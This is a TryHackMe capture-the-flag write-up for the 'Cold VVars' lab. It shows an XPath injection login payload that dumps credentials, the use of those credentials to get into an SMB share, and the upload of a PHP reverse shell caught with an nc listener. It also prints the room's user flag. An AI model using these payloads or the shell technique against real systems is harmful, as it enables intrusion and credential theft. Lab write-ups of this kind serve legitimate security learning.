# Cold VVars

Category: Web
Difficulty: Medium
Platform: TryHackMe
Status: User
Tags: Burpsuite, Samba, TryHackMe, XPATH, gobuster, nc, tmux, vim

***TABLE OF CONTENTS:***

- [Recon](https://www.notion.so/Cold-VVars-8725a8d8dd764cc1b164805d20b21c82)
- [User](https://www.notion.so/Cold-VVars-8725a8d8dd764cc1b164805d20b21c82)
- [Root](https://www.notion.so/Cold-VVars-8725a8d8dd764cc1b164805d20b21c82)

---

# Recon

Scanned all TCP ports:

```jsx
$ rustscan -a 10.10.246.170 0-64000 -- -sC -sV
Open 10.10.246.170:139
Open 10.10.246.170:445
Open 10.10.246.170:8082
Open 10.10.246.170:8080
[~] Starting Script
PORT     STATE SERVICE     REASON         VERSION
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
8082/tcp open  http        syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: INCOGNITO

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45684/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30974/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36679/udp): CLEAN (Failed to receive data)
|   Check 4 (port 13199/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-15T18:41:32
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   INCOGNITO<00>        Flags: <unique><active>
|   INCOGNITO<03>        Flags: <unique><active>
|   INCOGNITO<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2023-01-15T18:41:32+00:00

```

We have 2 web server running on http, so let’s scan it:

1. **8080/http** — Apache - Ubuntu
2. **8082/http** — Node.js Express framework

```jsx
$ dirb http://10.10.246.170:8080/
==> DIRECTORY: http://10.10.246.170:8080/dev/ with 403
```

found directory called "/dev" so time to enum the "/dev" folder

```jsx
$ dirb http://10.10.246.170:8080/dev/
==> http://10.10.246.170:8080/dev/note.txt
```

Let’s jump to the next web sever 8082/http

```jsx
$ dirb http://10.10.246.170:8082
==> http://10.10.246.170:8082/login
==> http://10.10.246.170:8082/Login
```

Maybe this login functionality is vulnerable. so let’s play with Burp (hint ⇒ XPATH)

```jsx
POST /login HTTP/1.1
Host: 10.10.246.170:8082
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.246.170:8082
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.246.170:8082/Login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=122323&password=232323&submit=Login
```

Send to Intruder: use xpath injection payload list

```jsx
POST /login HTTP/1.1
Host: 10.10.246.170:8082
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.246.170:8082
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.246.170:8082/Login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=§122323§&password=232323&submit=Login
```

Request:

```jsx
POST /login HTTP/1.1
Host: 10.10.246.170:8082
Content-Length: 58
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.246.170:8082
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.246.170:8082/Login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin"or 1=1 or ""="&password=232323&submit=Login
```

Response: we found 4 username and password

```jsx
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 154
ETag: W/"9a-jDiWIKWtVILDND5Mi/P2wSVilLU"
Date: Sun, 15 Jan 2023 19:04:01 GMT
Connection: close

Username || Password<br>
Tove || Jani<br>
Godzilla || KONGistheKING<br>
SuperMan || snyderCut<br>
ArthurMorgan || DeadEye<br>
```

okay now try to enum smba protocol:

```jsx
$ enum4linux 10.10.246.170
[+] Attempting to map shares on 10.10.246.170                                                                                                                          
                                                                                                                                                                       
//10.10.246.170/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                      
//10.10.246.170/SECURED Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                         
                                                                                                                                                                       
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                             
//10.10.246.170/IPC$    Mapping: N/A Listing: N/A Writing: N/A
```

Try to access this by using these credentials that we found on the web server:

```jsx
$ smbclient //10.10.246.170/SECURED -U ArthurMorgan
Password for [WORKGROUP\ArthurMorgan]:DeadEye
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 21 19:04:28 2021
  ..                                  D        0  Thu Mar 11 07:52:29 2021
  note.txt                            A       45  Thu Mar 11 07:19:52 2021

                7743660 blocks of size 1024. 4496532 blocks available
smb: \> get note.txt
getting file \note.txt of size 45 as note.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

we already found this on /dev folder, So let’s upload a reverse shell to the server.

```jsx
smb: \> put reverse.php
putting file reverse.php as \reverse.php (9.3 kb/s) (average 9.3 kb/s)
smb: \> ls
  .                                   D        0  Sun Jan 15 14:24:56 2023
  ..                                  D        0  Thu Mar 11 07:52:29 2021
  note.txt                            A       45  Thu Mar 11 07:19:52 2021
  reverse.php                         A     5493  Sun Jan 15 14:24:56 2023
```

make listener

```jsx
$ nc -lvlp 1234                        
listening on [any] 1234 ...
10.10.246.170: inverse host lookup failed: Unknown host
connect to [10.18.29.75] from (UNKNOWN) [10.10.246.170] 32800
Linux incognito 4.15.0-143-generic #147-Ubuntu SMP Wed Apr 14 16:10:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:26:17 up 51 min, 20 users,  load average: 0.00, 0.00, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
marston  pts/18   tmux(951).%18    18:37   49:06   0.95s  0.95s -bash
root     pts/20   127.0.0.1        18:38   47:53   0.63s  0.63s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**User.txt**

ae39f419ce0a3a26f15db5aaa7e446ff

**Root.txt**

rootme